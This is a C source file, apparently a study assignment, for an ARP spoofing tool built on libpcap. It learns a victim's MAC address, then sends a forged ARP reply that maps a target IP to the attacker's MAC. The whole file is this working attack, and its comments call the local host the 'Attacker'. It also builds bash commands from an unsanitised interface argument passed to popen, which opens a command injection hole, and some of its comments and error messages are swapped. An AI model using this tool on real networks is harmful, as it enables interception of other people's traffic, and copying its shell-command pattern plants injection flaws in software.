#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include "libnet-headers.h"

void usage() {
  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
  printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}


int get_my_ip_str(char *dev, char *str, int len) {
        FILE* fp;
        char cmdbuf[256];
        sprintf(cmdbuf, "/bin/bash -c \"ifconfig %s\" | grep \"inet \" | awk '{print $2}'\n", dev);
        fp = popen(cmdbuf, "r");
        if (fp == NULL) {
                perror("Fail to fetch mac address\n");
                return EXIT_FAILURE;
        }
        fgets(str, len, fp);
        pclose(fp);
        return EXIT_SUCCESS;
}


int send_arp_packet(pcap_t *handle, char* src_mac, char* dst_mac, char* src_ip, char* dst_ip, unsigned short int type) {
        struct eth_hdr* eth_header;
        struct arp_hdr* arp_header;

        u_char send_buf[42]; // initialized
        eth_header = (struct eth_hdr*)send_buf;

        if (type == ARPOP_REQUEST || dst_mac == NULL) {
            sscanf("ff:ff:ff:ff:ff:ff", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth_header->dst[0], &eth_header->dst[1],
             &eth_header->dst[2], &eth_header->dst[3], &eth_header->dst[4], &eth_header->dst[5]);
        } else {
            sscanf(dst_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth_header->dst[0], &eth_header->dst[1],
             &eth_header->dst[2], &eth_header->dst[3], &eth_header->dst[4], &eth_header->dst[5]);
        }

        sscanf(src_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth_header->src[0], &eth_header->src[1], &eth_header->src[2], &eth_header->src[3], &eth_header->src[4], &eth_header->src[5]);
        eth_header->type = ntohs(0x0806);



        arp_header = (struct arp_hdr*)(send_buf + sizeof(struct eth_hdr));
        arp_header->arp_hrd = ntohs(ARPHRD_ETHER);
        arp_header->arp_pro = ntohs(0x0800);
        arp_header->arp_hln = 6;
        arp_header->arp_pln = 4;
        arp_header->arp_op = ntohs(type);


        sscanf(src_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp_header->arp_sha[0], &arp_header->arp_sha[1], &arp_header->arp_sha[2], &arp_header->arp_sha[3], &arp_header->arp_sha[4], &arp_header->arp_sha[5]);
        sscanf(src_ip, "%hhd.%hhd.%hhd.%hhd", &arp_header->arp_spa[0], &arp_header->arp_spa[1], &arp_header->arp_spa[2], &arp_header->arp_spa[3]);
        if (type == ARPOP_REQUEST || dst_mac == NULL) {
                sscanf("00:00:00:00:00:00", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp_header->arp_tha[0], &arp_header->arp_tha[1], &arp_header->arp_tha[2], &arp_header->arp_tha[3], &arp_header->arp_tha[4], &arp_header->arp_tha[5]);
        }else{
                sscanf(dst_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp_header->arp_tha[0], &arp_header->arp_tha[1], &arp_header->arp_tha[2], &arp_header->arp_tha[3], &arp_header->arp_tha[4], &arp_header->arp_tha[5]);
        }

        sscanf(dst_ip, "%hhd.%hhd.%hhd.%hhd", &arp_header->arp_tpa[0], &arp_header->arp_tpa[1], &arp_header->arp_tpa[2], &arp_header->arp_tpa[3]);

        int pack_len = sizeof(struct eth_hdr) + sizeof(struct arp_hdr);
            if (pcap_sendpacket(handle, send_buf, pack_len) == -1) {
                fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));
                return EXIT_FAILURE;
            } else {
                return EXIT_SUCCESS;
            }

}

int get_my_mac_str(char *dev, char *str, int len) {
        FILE* fp;
        char cmdbuf[256];
        sprintf(cmdbuf, "/bin/bash -c \"ifconfig %s\" | grep '[ ][0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]' | awk '{print $2}'", dev);
        fp = popen(cmdbuf, "r");
        if (fp == NULL) {
                perror("Fail to fetch IPv4 address\n");
                return EXIT_FAILURE;
        }
        fgets(str, len, fp);
        pclose(fp);
        return EXIT_SUCCESS;
}

int main(int argc, char* argv[]){

    char my_ip_addr_str[20];

    char my_mac_addr_str[25];
    char *sender_ip_addr_str = argv[2]; //sender ip address string
    char sender_mac_addr_str[25];
    char *target_ip_addr_str = argv[3];

    u_char sender_mac_addr[6];

    char* dev = argv[1]; // dev = wlan0
    char errbuf[PCAP_ERRBUF_SIZE];

    struct pcap_pkthdr *hd;
    struct eth_hdr *eth_header;
    struct arp_hdr *arp_header;
    const u_char *pk;


    if (argc != 4) {
      usage();
      return -1;
    }


    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); // packet capture

    if (handle == NULL) {
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      return -1;
    }

    if (get_my_ip_str(dev, my_ip_addr_str, sizeof(my_ip_addr_str) - 1) == EXIT_FAILURE) {// Attacker MAC Address 를 얻어옴
            perror("Fail to fetch IPv4 address\n");
            exit(EXIT_FAILURE);
    }


    if (get_my_mac_str(dev, my_mac_addr_str, sizeof(my_mac_addr_str) - 1) == EXIT_FAILURE) { // Attacker IP Address 를 얻어옴
            perror("Fail to fetch Mac address\n");
            exit(EXIT_FAILURE);
    }

    printf("Attacker IP : : %s\n", my_ip_addr_str);
    printf("ATtacker MAC : %s\n", my_mac_addr_str);


    //send ARP Request
    send_arp_packet(handle, my_mac_addr_str, NULL, my_ip_addr_str, sender_ip_addr_str, ARPOP_REQUEST);

    //recv ARP reply
        while(1) {
            int status = pcap_next_ex(handle, &hd, &pk);
            if (status == 0) {
                printf("no packet\n");
                continue;
            } else if (status == -1) {
                 fprintf(stderr, "Failed to set buffer size on capture handle : %s\n",
                            pcap_geterr(handle));
                break;
            } else if (status == -2) {
                fprintf(stderr, "Finished reading packet data from packet files\n");
                break;
            }
            eth_header = (struct eth_hdr*)pk;
            if (ntohs(eth_header->type) == 0x0806) { // 0x0806 → ETHERTYPE_ARP
                arp_header = (struct arp_hdr*)(pk+ sizeof(struct eth_hdr));
            } else {
                //not arp proto
                continue;
            }
            if (ntohs(arp_header->arp_pro) != 0x0800) { // 0x0800 → ETHERTYPE_IP
                //not IPv4 ARP
                continue;
            }
            if (ntohs(arp_header->arp_op) != ARPOP_REPLY) {
                //not ARP reply
                continue;
            }
            for (int i=0; i < 6; i++) {
                sender_mac_addr[i] = arp_header->arp_sha[i];
            }
            sprintf(sender_mac_addr_str, "%02X:%02X:%02X:%02X:%02X:%02X", sender_mac_addr[0], sender_mac_addr[1],
             sender_mac_addr[2],sender_mac_addr[3],sender_mac_addr[4],sender_mac_addr[5]);
            break;
        }


        //recv ARP reply
        send_arp_packet(handle, my_mac_addr_str, sender_mac_addr_str, target_ip_addr_str, sender_ip_addr_str, ARPOP_REPLY);



    pcap_close(handle);
    return 0;
}
